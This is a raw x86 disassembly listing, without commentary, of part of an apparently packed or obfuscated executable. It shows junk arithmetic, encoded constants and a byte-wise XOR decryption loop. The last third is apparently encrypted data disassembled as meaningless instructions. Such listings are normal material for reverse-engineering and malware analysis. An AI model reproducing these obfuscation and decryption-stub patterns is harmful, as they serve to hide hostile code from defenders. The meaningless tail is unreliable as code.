  401df8:	xor    DWORD PTR ds:0x434008,0x435014
  401e02:	push   0x43a520
  401e07:	push   ebx
  401e08:	push   ebx
  401e09:	call   DWORD PTR ds:0x43a8fc
  401e0f:	test   eax,eax
  401e11:	mov    DWORD PTR ds:0x435004,0x62c7
  401e1b:	jne    0x40241c
  401e21:	sub    DWORD PTR ds:0x437000,0x3add
  401e2b:	push   0xd
  401e2d:	push   0x43a530
  401e32:	call   DWORD PTR ds:0x43a908
  401e38:	test   eax,eax
  401e3a:	mov    DWORD PTR ds:0x435010,0x130a
  401e44:	jne    0x402440
  401e4a:	and    DWORD PTR ds:0x434018,0x434024
  401e54:	push   0x43a544
  401e59:	push   ebx
  401e5a:	push   ebx
  401e5b:	call   DWORD PTR ds:0x43a8ec
  401e61:	test   eax,eax
  401e63:	mov    DWORD PTR ds:0x436008,0x3823
  401e6d:	jne    0x402440
  401e73:	adc    DWORD PTR ds:0x436014,0x437014
  401e7d:	push   0x9
  401e7f:	sub    DWORD PTR ds:0x437014,0x437010
  401e89:	push   0x43a55c
  401e8e:	call   DWORD PTR ds:0x43a8cc
  401e94:	not    DWORD PTR ds:0x43800c
  401e9a:	test   eax,eax
  401e9c:	mov    DWORD PTR ds:0x43501c,0x69de
  401ea6:	jne    0x40241c
  401eac:	sbb    DWORD PTR ds:0x436018,0x435008
  401eb6:	push   0x43a578
  401ebb:	push   ebx
  401ebc:	sub    DWORD PTR ds:0x438018,0x435008
  401ec6:	push   ebx
  401ec7:	call   DWORD PTR ds:0x43a8fc
  401ecd:	test   eax,eax
  401ecf:	mov    DWORD PTR ds:0x435018,0x17d7
  401ed9:	jne    0x40241c
  401edf:	sub    DWORD PTR ds:0x436010,0x435008
  401ee9:	push   0xd
  401eeb:	adc    DWORD PTR ds:0x43700c,0x43400c
  401ef5:	push   0x43a588
  401efa:	sbb    DWORD PTR ds:0x437014,0x437000
  401f04:	call   DWORD PTR ds:0x43a908
  401f0a:	test   eax,eax
  401f0c:	mov    DWORD PTR ds:0x434024,0x6a5c
  401f16:	jne    0x402440
  401f1c:	mov    eax,DWORD PTR [ebp-0x8]
  401f1f:	and    DWORD PTR ds:0x43500c,0x0
  401f29:	mov    ecx,DWORD PTR ds:0x43500c
  401f2f:	inc    ecx
  401f30:	mov    DWORD PTR ds:0x43500c,ecx
  401f36:	cmp    DWORD PTR ds:0x43500c,0x9
  401f3d:	ja     0x401f75
  401f43:	jmp    0x401f4e
  401f48:	call   DWORD PTR ds:0x43a904
  401f4e:	cmp    DWORD PTR ds:0x43500c,0x8
  401f55:	jne    0x401f68
  401f5b:	mov    ecx,DWORD PTR ds:0x43500c
  401f61:	inc    ecx
  401f62:	mov    DWORD PTR ds:0x43500c,ecx
  401f68:	cmp    DWORD PTR ds:0x43500c,0x14
  401f6f:	jb     0x401f29
  401f75:	mov    ecx,DWORD PTR [ebp-0x7c]
  401f78:	xor    eax,esi
  401f7a:	dec    DWORD PTR ds:0x43700c
  401f80:	add    eax,edi
  401f82:	mov    DWORD PTR ds:0x434010,0x1014
  401f8c:	cmp    eax,ecx
  401f8e:	jne    0x4023c3
  401f94:	sbb    DWORD PTR ds:0x437018,0x6417
  401f9e:	mov    eax,DWORD PTR [ebp-0x8]
  401fa1:	mov    ecx,DWORD PTR ds:0x43a2d4
  401fa7:	and    DWORD PTR ds:0x438014,0xc31
  401fb1:	mov    ecx,DWORD PTR [ecx+0x198]
  401fb7:	xor    eax,esi
  401fb9:	sub    DWORD PTR ds:0x436008,0x435010
  401fc3:	add    eax,edi
  401fc5:	cmp    eax,DWORD PTR [ecx]
  401fc7:	jne    0x402025
  401fcd:	movzx  eax,WORD PTR ds:0x435014
  401fd4:	and    DWORD PTR ds:0x434010,eax
  401fda:	mov    eax,DWORD PTR [ebp-0x8]
  401fdd:	adc    DWORD PTR ds:0x434018,0x436008
  401fe7:	push   0xf89c8585
  401fec:	xor    eax,esi
  401fee:	add    eax,edi
  401ff0:	adc    DWORD PTR ds:0x437018,0x127f
  401ffa:	push   eax
  401ffb:	dec    DWORD PTR ds:0x436004
  402001:	push   0xf89c85b9
  402006:	sbb    DWORD PTR ds:0x43501c,0x43600c
  402010:	push   DWORD PTR [ebp-0xc]
  402013:	and    DWORD PTR ds:0x434024,0x7b2c
  40201d:	push   DWORD PTR [ebp-0x8]
  402020:	call   0x407a51
  402025:	mov    eax,DWORD PTR [ebp-0xc]
  402028:	mov    DWORD PTR [ebp-0x4c],eax
  40202b:	mov    eax,DWORD PTR [ebp-0x8]
  40202e:	mov    DWORD PTR [ebp-0x60],eax
  402031:	mov    eax,DWORD PTR [ebp-0x60]
  402034:	xor    eax,esi
  402036:	add    eax,edi
  402038:	mov    DWORD PTR [ebp+0x10],eax
  40203b:	mov    eax,ds:0x43a154
  402040:	mov    eax,DWORD PTR [eax]
  402042:	mov    DWORD PTR [ebp+0x10],eax
  402045:	mov    eax,ds:0x43a35c
  40204a:	mov    eax,DWORD PTR [eax]
  40204c:	mov    DWORD PTR [ebp-0x18],eax
  40204f:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402056:	mov    eax,DWORD PTR [ebp+0xc]
  402059:	xor    eax,esi
  40205b:	add    eax,edi
  40205d:	mov    DWORD PTR [ebp+0xc],eax
  402060:	mov    eax,ds:0x43a2d4
  402065:	mov    DWORD PTR [ebp+0xc],eax
  402068:	mov    eax,DWORD PTR [ebp+0x10]
  40206b:	mov    DWORD PTR [ebp+0xc],eax
  40206e:	mov    eax,DWORD PTR [ebp+0xc]
  402071:	push   0x4
  402073:	pop    ecx
  402074:	sub    ecx,eax
  402076:	add    ecx,DWORD PTR [ebp-0x18]
  402079:	mov    DWORD PTR [ebp-0x38],0xf89c85c5
  402080:	mov    DWORD PTR [ebp+0x10],ecx
  402083:	mov    DWORD PTR [ebp-0x108],0xf89c85b9
  40208d:	mov    eax,DWORD PTR [ebp+0xc]
  402090:	mov    DWORD PTR [ebp-0x104],eax
  402096:	mov    eax,DWORD PTR [ebp+0x10]
  402099:	mov    DWORD PTR [ebp-0x100],eax
  40209f:	mov    eax,DWORD PTR [ebp-0x38]
  4020a2:	xor    eax,esi
  4020a4:	add    eax,edi
  4020a6:	mov    DWORD PTR [ebp-0xfc],eax
  4020ac:	lea    eax,[ebp-0x98]
  4020b2:	mov    DWORD PTR [ebp-0xf8],eax
  4020b8:	mov    eax,DWORD PTR [ebp-0x108]
  4020be:	xor    eax,esi
  4020c0:	add    eax,edi
  4020c2:	mov    DWORD PTR [ebp-0x108],eax
  4020c8:	lea    eax,[ebp-0x108]
  4020ce:	push   eax
  4020cf:	mov    eax,DWORD PTR [ebp-0x4c]
  4020d2:	xor    eax,esi
  4020d4:	add    eax,edi
  4020d6:	push   eax
  4020d7:	mov    eax,ds:0x43a2f4
  4020dc:	push   0x43a24a
  4020e1:	push   DWORD PTR [eax]
  4020e3:	call   0x404c64
  4020e8:	mov    eax,DWORD PTR [ebp+0xc]
  4020eb:	mov    ecx,DWORD PTR [ebp+0x10]
  4020ee:	mov    DWORD PTR [ebp-0x84],ecx
  4020f4:	mov    ecx,DWORD PTR [ebp-0x60]
  4020f7:	xor    ecx,esi
  4020f9:	mov    DWORD PTR [ebp-0x18],eax
  4020fc:	add    ecx,edi
  4020fe:	jmp    0x402361
  402103:	lea    edx,[ecx+eax*1]
  402106:	mov    DWORD PTR [ebp+0x10],edx
  402109:	mov    edx,DWORD PTR [ebp-0x84]
  40210f:	sub    edx,ecx
  402111:	mov    DWORD PTR [ebp+0xc],edx
  402114:	mov    edx,DWORD PTR [ebp+0xc]
  402117:	mov    DWORD PTR [ebp-0x54],edx
  40211a:	mov    edx,DWORD PTR [ebp+0x10]
  40211d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  402124:	mov    DWORD PTR [ebp-0x6c],edx
  402127:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  40212e:	mov    edx,DWORD PTR [ebp-0x50]
  402131:	xor    edx,esi
  402133:	add    edx,edi
  402135:	mov    DWORD PTR [ebp+0x10],edx
  402138:	mov    edx,DWORD PTR [ebp-0x50]
  40213b:	xor    edx,esi
  40213d:	add    edx,edi
  40213f:	mov    DWORD PTR [ebp+0xc],edx
  402142:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402149:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  402150:	mov    edx,DWORD PTR [ebp-0x50]
  402153:	mov    ebx,DWORD PTR [ebp-0x54]
  402156:	xor    edx,esi
  402158:	add    edx,edi
  40215a:	cmp    ebx,edx
  40215c:	je     0x402355
  402162:	mov    eax,DWORD PTR [ebp-0x24]
  402165:	xor    eax,esi
  402167:	mov    edx,0xffcd8d1e
  40216c:	sub    edx,eax
  40216e:	add    edx,DWORD PTR [ebp-0x54]
  402171:	mov    eax,DWORD PTR [ebp-0x24]
  402174:	mov    ebx,DWORD PTR [ebp+0x10]
  402177:	xor    eax,esi
  402179:	add    eax,edi
  40217b:	imul   eax,ebx
  40217e:	cmp    eax,edx
  402180:	ja     0x402352
  402186:	mov    edx,DWORD PTR [ebp+0x10]
  402189:	mov    eax,DWORD PTR [ebp-0x54]
  40218c:	mov    ebx,DWORD PTR [ebp-0x68]
  40218f:	sub    eax,edx
  402191:	xor    ebx,esi
  402193:	xor    edx,edx
  402195:	add    ebx,edi
  402197:	div    ebx
  402199:	mov    DWORD PTR [ebp+0xc],eax
  40219c:	mov    eax,DWORD PTR [ebp-0x74]
  40219f:	mov    edx,DWORD PTR [ebp+0xc]
  4021a2:	xor    eax,esi
  4021a4:	add    eax,edi
  4021a6:	cmp    edx,eax
  4021a8:	jbe    0x4021b8
  4021ae:	mov    eax,DWORD PTR [ebp-0x74]
  4021b1:	xor    eax,esi
  4021b3:	add    eax,edi
  4021b5:	mov    DWORD PTR [ebp+0xc],eax
  4021b8:	mov    eax,DWORD PTR [ebp-0x68]
  4021bb:	mov    edx,DWORD PTR [ebp+0xc]
  4021be:	xor    eax,esi
  4021c0:	add    eax,edi
  4021c2:	imul   eax,edx
  4021c5:	mov    DWORD PTR [ebp+0xc],eax
  4021c8:	mov    eax,DWORD PTR [ebp-0x50]
  4021cb:	mov    edx,DWORD PTR [ebp+0xc]
  4021ce:	xor    eax,esi
  4021d0:	add    eax,edi
  4021d2:	cmp    edx,eax
  4021d4:	je     0x40233b
  4021da:	mov    eax,DWORD PTR [ebp+0xc]
  4021dd:	mov    DWORD PTR [ebp-0x3c],eax
  4021e0:	mov    eax,DWORD PTR [ebp+0x10]
  4021e3:	add    eax,DWORD PTR [ebp-0x6c]
  4021e6:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  4021ed:	mov    DWORD PTR [ebp-0x30],eax
  4021f0:	mov    eax,0xf89c8584
  4021f5:	mov    DWORD PTR [ebp-0x64],eax
  4021f8:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4021ff:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402206:	mov    DWORD PTR [ebp-0x2c],eax
  402209:	mov    eax,DWORD PTR [ebp-0x38]
  40220c:	xor    eax,esi
  40220e:	add    eax,edi
  402210:	jmp    0x4022f7
  402215:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  40221c:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  402223:	mov    eax,DWORD PTR [ebp-0x2c]
  402226:	mov    edx,DWORD PTR [ebp+0xc]
  402229:	xor    eax,esi
  40222b:	add    eax,edi
  40222d:	imul   eax,edx
  402230:	mov    edx,DWORD PTR [ebp-0x30]
  402233:	mov    al,BYTE PTR [eax+edx*1]
  402236:	mov    BYTE PTR [ebp-0x1],al
  402239:	mov    eax,DWORD PTR [ebp-0x2c]
  40223c:	mov    edx,DWORD PTR [ebp+0xc]
  40223f:	xor    eax,esi
  402241:	add    eax,edi
  402243:	imul   eax,edx
  402246:	mov    edx,DWORD PTR [ebp-0x58]
  402249:	xor    edx,esi
  40224b:	add    eax,edx
  40224d:	mov    edx,DWORD PTR [ebp-0x30]
  402250:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402258:	mov    edx,DWORD PTR [ebp-0x78]
  40225b:	xor    edx,esi
  40225d:	lea    eax,[edx+eax*1+0x3272e2]
  402264:	movzx  edx,BYTE PTR [ebp-0x1]
  402268:	xor    edx,eax
  40226a:	mov    BYTE PTR [ebp-0x1],dl
  40226d:	mov    al,BYTE PTR [ebp-0x1]
  402270:	mov    edx,DWORD PTR [ebp-0x2c]
  402273:	mov    ebx,DWORD PTR [ebp+0xc]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	imul   edx,ebx
  40227d:	mov    ebx,DWORD PTR [ebp-0x30]
  402280:	mov    BYTE PTR [edx+ebx*1],al
  402283:	mov    eax,DWORD PTR [ebp-0x2c]
  402286:	mov    edx,DWORD PTR [ebp+0xc]
  402289:	xor    eax,esi
  40228b:	add    eax,edi
  40228d:	imul   eax,edx
  402290:	mov    edx,DWORD PTR [ebp-0x30]
  402293:	mov    al,BYTE PTR [eax+edx*1]
  402296:	mov    BYTE PTR [ebp-0x1],al
  402299:	mov    eax,DWORD PTR [ebp-0x2c]
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	xor    eax,esi
  4022a1:	add    eax,edi
  4022a3:	imul   eax,edx
  4022a6:	mov    edx,DWORD PTR [ebp-0x64]
  4022a9:	xor    edx,esi
  4022ab:	add    eax,edx
  4022ad:	mov    edx,DWORD PTR [ebp-0x30]
  4022b0:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  4022b8:	mov    edx,DWORD PTR [ebp-0x80]
  4022bb:	xor    edx,esi
  4022bd:	lea    eax,[edx+eax*1+0x3272e2]
  4022c4:	movzx  edx,BYTE PTR [ebp-0x1]
  4022c8:	xor    edx,eax
  4022ca:	mov    BYTE PTR [ebp-0x1],dl
  4022cd:	mov    al,BYTE PTR [ebp-0x1]
  4022d0:	mov    edx,DWORD PTR [ebp-0x2c]
  4022d3:	mov    ebx,DWORD PTR [ebp+0xc]
  4022d6:	xor    edx,esi
  4022d8:	add    edx,edi
  4022da:	imul   edx,ebx
  4022dd:	mov    ebx,DWORD PTR [ebp-0x30]
  4022e0:	mov    BYTE PTR [edx+ebx*1],al
  4022e3:	mov    eax,DWORD PTR [ebp-0x10]
  4022e6:	mov    edx,DWORD PTR [ebp-0x64]
  4022e9:	xor    eax,esi
  4022eb:	xor    edx,esi
  4022ed:	add    eax,edi
  4022ef:	add    edx,edi
  4022f1:	imul   eax,edx
  4022f4:	add    eax,DWORD PTR [ebp+0xc]
  4022f7:	mov    DWORD PTR [ebp+0xc],eax
  4022fa:	mov    eax,DWORD PTR [ebp+0xc]
  4022fd:	mov    edx,DWORD PTR [ebp-0x3c]
  402300:	cmp    edx,eax
  402302:	jb     0x402215
  402308:	mov    eax,DWORD PTR [ebp-0x64]
  40230b:	mov    edx,DWORD PTR [ebp-0x3c]
  40230e:	xor    eax,esi
  402310:	add    eax,edi
  402312:	imul   eax,edx
  402315:	mov    edx,DWORD PTR [ebp-0x38]
  402318:	xor    edx,esi
  40231a:	add    edx,edi
  40231c:	or     eax,edx
  40231e:	mov    edx,DWORD PTR [ebp-0x24]
  402321:	xor    edx,esi
  402323:	add    eax,edx
  402325:	mov    edx,DWORD PTR [ebp-0x24]
  402328:	xor    edx,esi
  40232a:	add    eax,edx
  40232c:	mov    edx,DWORD PTR [ebp+0x10]
  40232f:	lea    eax,[eax+edx*1+0x64e5c4]
  402336:	jmp    0x40234a
  40233b:	mov    eax,DWORD PTR [ebp-0x24]
  40233e:	mov    edx,DWORD PTR [ebp+0x10]
  402341:	xor    eax,esi
  402343:	lea    eax,[eax+edx*1+0x3272e2]
  40234a:	mov    DWORD PTR [ebp+0x10],eax
  40234d:	jmp    0x402162
  402352:	mov    eax,DWORD PTR [ebp-0x18]
  402355:	mov    edx,DWORD PTR [ebp-0x4c]
  402358:	xor    edx,esi
  40235a:	lea    ecx,[ecx+edx*1+0x3272e2]
  402361:	lea    edx,[ecx-0x3272e2]
  402367:	xor    edx,esi
  402369:	cmp    edx,0xf89c9585
  40236f:	jne    0x402103
  402375:	mov    ecx,DWORD PTR [ebp-0x60]
  402378:	mov    edx,DWORD PTR [ebp-0x4c]
  40237b:	mov    ebx,DWORD PTR [ebp-0x60]
  40237e:	xor    edx,esi
  402380:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402387:	xor    ecx,esi
  402389:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  402390:	xor    ebx,esi
  402392:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402399:	mov    edx,DWORD PTR [ebp-0x4c]
  40239c:	xor    edx,esi
  40239e:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  4023a5:	mov    eax,DWORD PTR [ebp-0x4c]
  4023a8:	mov    eax,DWORD PTR [ebp-0x8]
  4023ab:	xor    eax,esi
  4023ad:	add    eax,edi
  4023af:	mov    ds:0x43a358,eax
  4023b4:	mov    eax,DWORD PTR [ebp-0x8]
  4023b7:	xor    eax,esi
  4023b9:	add    eax,edi
  4023bb:	xor    ebx,ebx
  4023bd:	mov    ds:0x43a350,eax
  4023c2:	inc    ebx
  4023c3:	lea    eax,[ebp-0x40]
  4023c6:	mov    DWORD PTR [ebp-0x88],eax
  4023cc:	lea    eax,[ebp+0x4]
  4023cf:	mov    DWORD PTR [ebp-0x40],eax
  4023d2:	mov    eax,DWORD PTR [ebp-0x40]
  4023d5:	test   eax,eax
  4023d7:	je     0x402572
  4023dd:	push   0x43a59c
  4023e2:	push   ebx
  4023e3:	push   ebx
  4023e4:	call   DWORD PTR ds:0x43a8ec
  4023ea:	test   eax,eax
  4023ec:	jne    0x402440
  4023f2:	push   0x9
  4023f4:	push   0x43a5b4
  4023f9:	call   DWORD PTR ds:0x43a8cc
  4023ff:	test   eax,eax
  402401:	jne    0x40241c
  402407:	push   0x43a5d0
  40240c:	push   ebx
  40240d:	push   ebx
  40240e:	call   DWORD PTR ds:0x43a8fc
  402414:	test   eax,eax
  402416:	je     0x40242b
  40241c:	lea    eax,[ebp-0x20]
  40241f:	push   eax
  402420:	call   DWORD PTR ds:0x43a8bc
  402426:	jmp    0x40258d
  40242b:	push   0xd
  40242d:	push   0x43a5e0
  402432:	call   DWORD PTR ds:0x43a908
  402438:	test   eax,eax
  40243a:	je     0x402447
  402440:	xor    eax,eax
  402442:	jmp    0x40258d
  402447:	mov    DWORD PTR [ebp-0x94],0xf152c3c
  402451:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  40245b:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  402465:	mov    DWORD PTR [ebp-0x90],0x72670a1d
  40246f:	call   0x405387
  402474:	mov    eax,DWORD PTR [ebp-0x28]
  402477:	mov    eax,DWORD PTR [ebp-0xc]
  40247a:	mov    eax,DWORD PTR [ebp-0x8]
  40247d:	mov    DWORD PTR [ebp+0xc],eax
  402480:	mov    eax,eax
  402482:	mov    eax,ds:0x43a2d4
  402487:	mov    eax,DWORD PTR [eax+0x1c8]
  40248d:	mov    eax,DWORD PTR [eax]
  40248f:	cdq    
  402490:	mov    ebx,eax
  402492:	mov    eax,0xfabdbee7
  402497:	add    ebx,eax
  402499:	adc    edx,0xffffffff
  40249c:	and    DWORD PTR [ebp-0x10],0x0
  4024a0:	xor    edx,0x0
  4024a3:	mov    DWORD PTR [ebp-0x6c],edx
  4024a6:	mov    edx,DWORD PTR [ebp+0xc]
  4024a9:	mov    DWORD PTR [ebp-0x14],edx
  4024ac:	mov    ecx,0x8a29a12d
  4024b1:	xor    ebx,ecx
  4024b3:	add    DWORD PTR [ebp-0x14],eax
  4024b6:	mov    edx,DWORD PTR [ebp-0x14]
  4024b9:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4024bd:	xor    edx,ecx
  4024bf:	mov    DWORD PTR [ebp-0x5c],edx
  4024c2:	mov    edx,DWORD PTR [ebp-0x10]
  4024c5:	xor    edx,0x0
  4024c8:	mov    DWORD PTR [ebp-0x58],edx
  4024cb:	cmp    DWORD PTR [ebp-0x5c],ebx
  4024ce:	jne    0x4024e0
  4024d4:	mov    edx,DWORD PTR [ebp-0x6c]
  4024d7:	cmp    DWORD PTR [ebp-0x58],edx
  4024da:	je     0x40250f
  4024e0:	mov    edx,DWORD PTR ds:0x43a2d4
  4024e6:	mov    edx,DWORD PTR [edx+0x1c0]
  4024ec:	mov    edx,DWORD PTR [edx]
  4024ee:	xor    ebx,ebx
  4024f0:	add    edx,eax
  4024f2:	adc    ebx,0xffffffff
  4024f5:	xor    edx,ecx
  4024f7:	xor    ebx,0x0
  4024fa:	cmp    edx,0x70941fc5
  402500:	jne    0x402572
  402506:	cmp    ebx,0xffffffff
  402509:	jne    0x402572
  40250f:	mov    edx,DWORD PTR ds:0x43a350
  402515:	mov    ebx,DWORD PTR ds:0x43a358
  40251b:	xor    edx,ebx
  40251d:	mov    DWORD PTR ds:0x43a350,edx
  402523:	mov    edx,DWORD PTR [ebp-0x40]
  402526:	mov    ebx,DWORD PTR ds:0x43a350
  40252c:	add    ebx,DWORD PTR [edx]
  40252e:	mov    edx,DWORD PTR [ebp-0x40]
  402531:	mov    DWORD PTR [edx],ebx
  402533:	mov    edx,DWORD PTR [ebp+0xc]
  402536:	xor    esi,edx
  402538:	mov    edx,DWORD PTR ds:0x43a350
  40253e:	add    esi,edi
  402540:	xor    ebx,ebx
  402542:	add    esi,eax
  402544:	adc    ebx,0xffffffff
  402547:	xor    edi,edi
  402549:	xor    esi,ecx
  40254b:	xor    ebx,0x0
  40254e:	add    edx,eax
  402550:	adc    edi,0xffffffff
  402553:	xor    edx,ecx
  402555:	xor    edi,0x0
  402558:	cmp    edx,esi
  40255a:	jne    0x402572
  402560:	cmp    edi,ebx
  402562:	jne    0x402572
  402568:	mov    eax,ds:0x43a350
  40256d:	mov    ds:0x43a358,eax
  402572:	mov    eax,ds:0x43a2d4
  402577:	push   0x4
  402579:	add    eax,0x1cc
  40257e:	push   eax
  40257f:	lea    eax,[ebp-0x28]
  402582:	push   eax
  402583:	call   0x402598
  402588:	mov    eax,DWORD PTR [ebp-0x28]
  40258b:	mov    eax,DWORD PTR [eax]
  40258d:	pop    edi
  40258e:	pop    ebx
  40258f:	pop    esi
  402590:	leave  
  402591:	ret    0xc
  402594:	xor    eax,eax
  402596:	inc    eax
  402597:	ret    
  402598:	push   ebp
  402599:	mov    ebp,esp
  40259b:	sub    esp,0x10
  40259e:	mov    ecx,DWORD PTR ds:0x438004
  4025a4:	sbb    ecx,DWORD PTR ds:0x434000
  4025aa:	mov    DWORD PTR ds:0x438004,ecx
  4025b0:	mov    eax,0xf89c8585
  4025b5:	add    DWORD PTR ds:0x437018,0x7358
  4025bf:	mov    DWORD PTR [ebp-0x4],eax
  4025c2:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4025c9:	movzx  edx,WORD PTR ds:0x436014
  4025d0:	sub    DWORD PTR ds:0x43701c,edx
  4025d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4025d9:	dec    edx
  4025da:	jmp    0x404996
  4025df:	sub    DWORD PTR [edx+0x13b763cc],eax
  4025e5:	jae    0x402659
  4025e7:	xchg   ecx,eax
  4025e8:	xchg   esp,eax
  4025e9:	pop    ecx
  4025ea:	int3   
  4025eb:	(bad)  
  4025ec:	bound  ebx,QWORD PTR [edx+0x7c7c7c11]
  4025f2:	jl     0x4025c7
  4025f4:	pop    edi
  4025f5:	jl     0x402673
  4025f7:	adc    eax,0x1139172e
  4025fc:	and    eax,0x30652f13
  402601:	popa   
  402602:	pusha  
  402603:	or     BYTE PTR [edx+0x6c],bh
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	xor    al,0xc5
  40260a:	fdivp  st(1),st
  40260c:	push   0x42
  40260e:	arpl   WORD PTR [ecx+0x53],di
  402611:	stos   BYTE PTR es:[edi],al
  402612:	jp     0x402681
  402614:	push   ecx
  402615:	iret   
  402616:	pop    ebp
  402617:	dec    esp
  402618:	cmp    cl,BYTE PTR [esi+0x577087fc]
  40261e:	dec    ebp
  40261f:	jg     0x402658
  402621:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402627:	jmp    DWORD PTR cs:[eax-0x22]
  40262b:	cld    
  40262c:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402630:	xor    ebp,ecx
  402632:	mov    esp,0xd82b87ed
  402637:	and    DWORD PTR [ecx],0xf
  40263a:	push   ecx
  40263b:	mov    ds:0x6df7c68c,eax
  402640:	fld    QWORD PTR [esi]
  402642:	(bad)  
  402643:	or     ah,bh
  402645:	and    BYTE PTR [edx],dl
  402647:	inc    edx
  402648:	push   cs
  402649:	and    BYTE PTR [ebx+0x62],ah
  40264c:	mov    cl,0xaf
  40264e:	sub    ebx,DWORD PTR [ecx+0x5]
  402651:	mov    al,ds:0x2341e1ff
  402656:	jbe    0x40268c
  402658:	ret    0xf153
  40265b:	sbb    al,0xfc
  40265d:	jb     0x402618
  40265f:	jnp    0x40263e
  402661:	xchg   edx,eax
  402662:	pop    edi
  402663:	cmp    DWORD PTR [ecx+0x49841607],0xb
  40266a:	cwde   
  40266b:	ds je  0x4025f9
  40266e:	add    ebx,esp
  402670:	sub    eax,0x4b368d54
  402675:	push   esi
  402676:	sti    
  402677:	iret   
  402678:	mov    WORD PTR [ecx],fs
  40267a:	or     edx,0x6982ceb7
  402680:	out    0x45,al
  402682:	push   esp
  402683:	dec    esi
  402684:	push   cs
  402685:	cmp    BYTE PTR [ebx],cl
  402687:	xor    BYTE PTR [ebx],bl
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    ebx
  40268b:	int3   
  40268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268d:	dec    edx
  40268e:	fiadd  DWORD PTR [esi]
  402690:	push   eax
  402691:	std    
  402692:	push   esp
  402693:	push   eax
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	icebp  
  402696:	bound  edi,QWORD PTR [edi-0x55e7bb0e]
  40269c:	push   cs
  40269d:	into   
  40269e:	xor    ebp,DWORD PTR [ebp+0xbd8082b]
  4026a4:	adc    bh,dl
  4026a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026a7:	mov    ebx,0xd3898f41
  4026ac:	ja     0x4026f2
  4026ae:	mov    ecx,0xf96d4090
  4026b3:	jl     0x402673
  4026b5:	xor    al,0x94
  4026b7:	bound  esp,QWORD PTR [ebp+0x42]
  4026ba:	imul   ebx,DWORD PTR [eiz*8+0x4141691c],0xffffffb5
  4026c2:	cmp    bl,BYTE PTR [ebx+0x43168d6]
  4026c8:	es data16 jle 0x40270d
  4026cc:	ret    
  4026cd:	lds    esi,FWORD PTR [esp+eax*4+0x59]
  4026d1:	mov    ch,0x44
  4026d3:	out    dx,al
  4026d4:	cld    
  4026d5:	pushf  
  4026d6:	sbb    eax,0xe640a01e
  4026db:	js     0x402716
  4026dd:	mov    esi,0x4b89119b
  4026e2:	rcr    DWORD PTR [edx+edx*4],0x9c
  4026e6:	mov    dh,0xf8
  4026e8:	mov    eax,ds:0xc13df7c2
  4026ed:	loope  0x402719
  4026ef:	out    0xd4,eax
  4026f1:	in     eax,dx
  4026f2:	hlt    
  4026f3:	hlt    
  4026f4:	int3   
  4026f5:	adc    eax,0xfa0f3e98
  4026fa:	push   ecx
  4026fb:	loopne 0x40269a
  4026fd:	push   DWORD PTR [ebx+edi*8+0x16ae6d8e]
  402704:	fcom   st(1)
  402706:	fisttp DWORD PTR [ecx+0x53d467a4]
  40270c:	jl     0x40277e
  40270e:	jns    0x402756
  402710:	sub    dh,al
  402712:	enter  0x6299,0xee
  402716:	ficomp WORD PTR [edi]
  402718:	hlt    
  402719:	mov    BYTE PTR [edx-0x4c],0xcc
  40271d:	mov    dh,BYTE PTR [eax+0x2fe5e78c]
  402723:	dec    ecx
  402724:	sbb    DWORD PTR [eax+0x4b1c575f],esp
  40272a:	ins    BYTE PTR es:[edi],dx
  40272b:	lea    ecx,[eax]
  40272d:	and    BYTE PTR [eax+esi*1],al
  402730:	in     al,0xb0
  402732:	push   eax
  402733:	ins    BYTE PTR es:[edi],dx
  402734:	mov    ecx,0x580b1759
  402739:	sbb    BYTE PTR [edx-0x309f5803],cl
  40273f:	and    ch,BYTE PTR [esi]
  402741:	and    DWORD PTR [ecx+ecx*1],esp
  402744:	fs push 0x6578a181
  40274a:	in     eax,0xc6
  40274c:	sbb    eax,0x3c
  40274f:	mov    cl,0x32
  402751:	pop    ss
  402752:	aaa    
  402753:	ins    DWORD PTR es:[edi],dx
  402754:	aaa    
  402755:	in     eax,0x49
  402757:	outs   dx,BYTE PTR ds:[esi]
  402758:	cmp    DWORD PTR [ebp+0x4],ebx
  40275b:	(bad)  
  40275c:	iret   
  40275d:	or     eax,0x75c35419
  402762:	(bad)  
  402763:	arpl   si,di
  402765:	sub    ecx,DWORD PTR [ebp+esi*1+0x54]
  402769:	inc    edx
  40276a:	imul   edx,DWORD PTR [eax],0xffffff98
  40276d:	icebp  
  40276e:	mov    ds:0x9c2ceec1,al
  402773:	dec    eax
  402774:	lds    ebp,FWORD PTR [ecx]
  402776:	dec    eax
  402777:	jl     0x4027e2
  402779:	pop    esi
  40277a:	stc    
  40277b:	lods   eax,DWORD PTR ds:[esi]
  40277c:	(bad)  
  40277d:	pop    edx
  40277e:	outs   dx,BYTE PTR ds:[esi]
  40277f:	mov    ds:0x70ad38a8,eax
  402784:	pop    es
  402785:	jge    0x402758
  402787:	jo     0x40278f
  402789:	inc    edi
  40278a:	(bad)  
  40278b:	mov    edi,0xf663b7c0
  402790:	xchg   ebp,eax
